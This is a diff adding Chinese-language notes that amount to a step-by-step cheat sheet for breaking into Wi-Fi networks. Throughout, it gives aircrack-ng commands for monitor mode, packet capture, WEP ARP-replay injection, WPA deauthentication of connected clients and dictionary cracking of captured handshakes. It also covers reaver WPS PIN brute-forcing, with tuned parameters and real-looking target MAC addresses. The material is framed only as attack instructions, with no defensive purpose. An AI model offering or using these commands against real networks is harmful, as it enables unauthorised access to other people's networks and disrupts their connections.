@@ -1,0 +1,52 @@
+开启wlan嗅探模式
+airmon-ng start wlan1
+
+sudo ifconfig wlan1mon down
+sudo iwconfig wlan1mon mode monitor
+sudo ifconfig wlan1mon up
+sudo iwconfig wlan1mon
+reaver -i wlan0mon -b CC:34:29:48:18:E2 -p 92251700
+
+无线监听
+airodump-ng wlan1mon(使用ifconfig查看无线适配器名称，嗅探模式开启后，名称会改变)
+
+wep无线：
+无线抓包
+airodump-ng --ivs -w longas -c 11 wlan0mon
+保存logas前缀的.ivs后缀，11为AP的频道(频道在监听下可看，ch栏)；之后打开文件，输入logas-01.ivs，数字编号随文件数量而变
+
+ArpRequest注入攻击
+无线密码为wep方式可用
+这样采用了一种称之为ArpRequest的方式来读取ARP请求报文，并伪造大量的报文再次重发出去，以便刺激AP产生更多的数据包，从而加快破解过程
+aireplay-ng -3 -b AP-mac -h Client-mac wlan0mon
+
+当IVs值达到2万以上，可尝试下面命令破解
+aircrack-ng 捕获的IVS文件(longas-01.ivs)
+
+wpa无线：
+无线抓包
+airodump-ng -c 6 -w asd wlan0mon
+保存为cap文件，文件名cap-01.cap
+
+Deauth攻击
+无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了 
+aireplay-ng -0 10 -a mac -c mac wlan0mon
+
+字典破解密码
+aircrack-ng -w dic 捕获的cap文件 
+格式：aircrack-ng -w pwnum.dic longas-01.cap
+字典文件需要预先准备好，这里使用～（根目录）下的pwnum字典文件来破解
+
+ping无线密码(如今路由器防ping策略多，难度大)
+reaver -i wlan0mon -b MAC -vv
+-i 监听后接口名称
+-b 目标mac地址
+-a 自动检测目标AP最佳配置
+-S 使用最小的DH key（可以提高PJ速度）
+-vv 显示更多的非严重警告
+-d 即delay每穷举一次的闲置时间 预设为1秒
+-t 即timeout每次穷举等待反馈的最长时间
+-c指定频道可以方便找到信号，如-c1 指定1频道，大家查看自己的目标频道做相应修改 （非TP-LINK路由推荐–d9 –t9参数防止路由僵死)
+目标信号非常好: reaver -i wlan0mon -b A8:57:4E:9A:28:6E -a -S -vv -d 0 -c 1
+目标信号普通: reaver -i wlan0mon -b MAC -a -S -vv -d 2 -t 5 -c 1
+目标信号一般: reaver -i wlan0mon -b MAC -a -S -vv -d 5 -c 1
